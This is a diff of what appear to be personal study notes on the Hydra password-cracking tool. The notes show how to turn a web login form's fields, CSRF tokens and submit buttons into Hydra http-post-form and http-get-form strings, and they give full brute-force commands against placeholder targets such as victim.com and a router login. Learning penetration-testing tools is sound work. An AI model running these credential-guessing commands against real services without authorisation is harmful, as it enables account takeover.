@@ -3,6 +3,7 @@
 - it's a powerful and popular password-cracking tool used to perform brute-force attacks against various network services.
 - It's especially effective for testing the security of web applications where a login form exists.
 
+
                         KEY FEATURES.
                     -------------------
 > Supports Multiple Protocols:
@@ -28,13 +29,46 @@
     xi. mongodb
     xii. mssql
     xiii. mysql
-    etc-->  redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp adam6500 asterisk cisco cisco-enable cobaltstrike cvs firebird nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp
+    etc-->  redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 
+            ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp adam6500 asterisk cisco cisco-enable 
+            cobaltstrike cvs firebird nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp
 
 > fail string characters.
     > F= indicates a failure string (e.g., incorrect login).
     > S= specifies a success string (e.g., a message displayed when a login is successful).
     > C= lets you match conditions in the response code (e.g., HTTP status codes).
     > B= can be used to match the body of the response, but it’s not as common as F=.
+
+> Detecting the right module.
+    - Inspect Form methods.
+        * view HTML <form method="POST"> 
+            + use http-post-form.
+        
+    - Action url & fields 
+        * Note the action path and <input name> attributes
+            + map to username=^USER^&password=^PASS^ syntax.
+
+    - CAPTCHA/JS Flows
+        * if login relies on dynamic tokens or Javascript, Hydra may fail;
+        * consider Burp/ZAP scripting or custom pre-fetch hooks.
+
+> Choosing the right HTTP module from the <form> Tag.
+    EG.
+        <form action="/login" method="POST">
+        <input name="username" …>
+        <input name="password" …>
+        <button type="submit">Log in</button>
+        </form>
+
+            * Method="post" 
+                + use http-post-form
+                    - You're sending credentials in the request body.
+            * Method="get"
+                + use http-get-form 
+                    - The form serializes its input into the query string of the URL.
+
+    - if there is no <form> at all, and the page simply responds to fetching a URL, you can use the simpler http-get:// module.
+
 
 
                     LIMITATIONS.
@@ -49,6 +83,105 @@
                     USAGES.
                 ============
 - Hydra is mostly used for attacking server services like ssh, telnet, ftp, etc...
+
+NB://
+    - ensure we add :// after the module 
+        EG.
+            http-get-form://
+
+    - it technically doesn't matter whether the " goes before or after the :// but for good practice cover the module and the path with the quotes.
+        EG.
+            "http-post-form://localhost:8080/"
+                also works  
+            http-post-form://"localhost:8080/"
+
+        > CSRF tokens, hidden fields & submit buttons.
+            + Many sites embed a one-time token or other hidden inputs to prevent automated login.
+            + You must include those in your <param-string>
+                EG.
+                    <form action="/auth" method="POST">
+                        <input name="emailAddr">
+                        <input name="secretKey">
+                        <input type="hidden" name="token" value="XYZ123">
+                        <button name="submitBtn" value="LoginNow">Login</button>
+                    </form>
+                ANS.
+                    hydra -L emails.txt -P keys.txt "http-post-form://victim.com/auth:token=XYZ123&emailAddr=^USER^&secretKey=^PASS^&submitBtn=LoginNow:F=Error"
+
+    - root path vs subpath.
+        > if action="/", your path is just /.
+            EG.
+                http-post-form://"site.com/:user=^USER^&pass=^PASS^:F=Bad"
+
+        > if action="/loginPage", use /loginPage.
+            EG.
+                "http-post-form://site.com/loginPage:…"
+
+    - router example revisited.
+        > if your router's login form posts to login.asp with GET:
+            EG.
+                "http-get-form://192.168.0.1/login.asp:username=^USER^&password=^PASS^:F=Try\ again"
+
+    - Handling bbuttons, tokens & hidden fields.
+        > modern forms often have extra bits beyond just username and password. 
+        > Here's how to spot them in the HTML and mirror them in Hydra.
+            EG.
+                <form action="/auth" method="POST">
+                    <input type="text"  name="userEmail">
+                    <input type="password" name="passKey">
+                    <input type="hidden" name="csrf_token" value="ABC123">
+                    <button type="submit" name="actionBtn" value="SignInNow">Sign In</button>
+                </form>
+
+                + hidden CSRF token.
+                    csrf_token=ABC123
+                
+                + custom field names.
+                    userEmail=^USER^
+                    passKey=^PASS^
+
+                + Submit button (some servers reject forms without it):
+                    actionBtn=SignInNow 
+                
+                + All together, your Hydra command becomes.
+                    hydra -L users.txt -P passes.txt http-post-form://"victim.com/auth:csrf_token=ABC123&userEmail=^USER^&passKey=^PASS^&actionBtn=SignInNow:F=Invalid credentials"
+
+    - what happens if you omit the failure (:F=) or success (:S=) match?
+        > By default, Hydra needs some way to know "did this login work or not?"
+        > if you don't supply a :F= or :S=, Hydra will:
+            + For http-get/https-get (no form-module) : assume any HTTP 200 is "success," and non-200 is failure.
+            + For http-get-form/http-post-form: it will error out, complaining that you haven’t given it a pattern to detect failure or success—because form-modules always require one of those match flags.
+
+    - sometimes action="#" forms 
+        > is used to post to itself.
+            + if your form lives at, say, https://victim.com/login, and the HTML reads.
+                EG.
+                    <form action="#" method="POST">
+                    …inputs…
+                    </form>
+
+                    - then # tells the browser "post back to /login" . 
+                    - in Hydra you'd replace # with the real path:
+                        EG.
+                            hydra -l user -P pass.txt http-post-form://"victim.com/login:username=^USER^&password=^PASS^:F=Login\ failed"
+
+                                * don't literally put # into your Hydra string.
+                                * use whatever comes before the # in the browser's address bar (e.g. /login)
+
+        > never actually submit HTML
+            + they fire an AJAX call instead. In that case:
+                * Open devTools -> Network tab.
+                * Submit the form once manually.
+                * Watch which XHR (fetch) request goes out - note its URL path, method(POST/GET), headers, JSON body or form data.
+                    EG.
+                        POST https://api.victim.com/auth/check
+                        Content-Type: application/json
+
+                        {"user":"alice","pass":"secret","token":"XYZ"}
+
+                * target that endpoint in hydra instead of the # form.
+                    EG.
+                        hydra -l alice -P pass.txt http-post-form://"api.victim.com/auth/check:User=^USER^&pass=^PASS^&token=XYZ:F=unauthorized"
 
 
                     BASIC SYNTAX.
@@ -85,14 +218,14 @@ EG.
                     ------------------
 1. Brute-force using a single username:
     EG.
-        hydra -l admin -P /path/to/password_list.txt http-get://example.com/login
+        hydra -l admin -P /path/to/password_list.txt http-get://"example.com/login"
 
             - This attempts to log in as admin using the passwords listed in the specified file against the login page of http://example.com/login.
 
 
 2. Brute-force using multiple usernames:
     EG.
-        hydra -L /path/to/usernames.txt -P /path/to/password_list.txt http-get://example.com/login
+        hydra -L /path/to/usernames.txt -P /path/to/password_list.txt http-get://"example.com/login"
 
             - This command will try each username in usernames.txt with each password in password_list.txt.
 
@@ -100,9 +233,9 @@ EG.
 3. HTTP POST with Custom Parameters
     - When a login form uses POST requests, you can specify the parameters for username and password.
         EG.
-            hydra -l admin -P /path/to/password_list.txt -d http-post-form "www.example.com/login:username=^USER^&password=^PASS^:F=incorrect"
+            hydra -l admin -P /path/to/password_list.txt -d http-post-form://"www.example.com/login:username=^USER^&password=^PASS^:F=incorrect"
                 OR 
-            hydra -l admin -P /path/to/password_list.txt -d localhost http-post-form "/example.com/login:username=^USER^&password=^PASS^:F=incorrect" # for localhost .
+            hydra -l admin -P /path/to/password_list.txt http-post-form://"localhost/example.com/login:username=^USER^&password=^PASS^:F=incorrect" # for localhost .
                 - http-post-form:
                     > Specifies that it is a POST request.
                 
@@ -124,7 +257,7 @@ EG.
 
                             - it should be added to the custom parameters.
                                 EG.
-                                    hydra -l admin -P /path/to/password_list.txt -d http-post-form "www.example.com/login:username=^USER^&password=^PASS^&Login=Login:F=incorrect"
+                                    hydra -l admin -P /path/to/password_list.txt -d http-post-form://"www.example.com/login:username=^USER^&password=^PASS^&Login=Login:F=incorrect"
 
                                         - Login=Login: 
                                             > This matches the name and value of the submit button in the form you inspected.
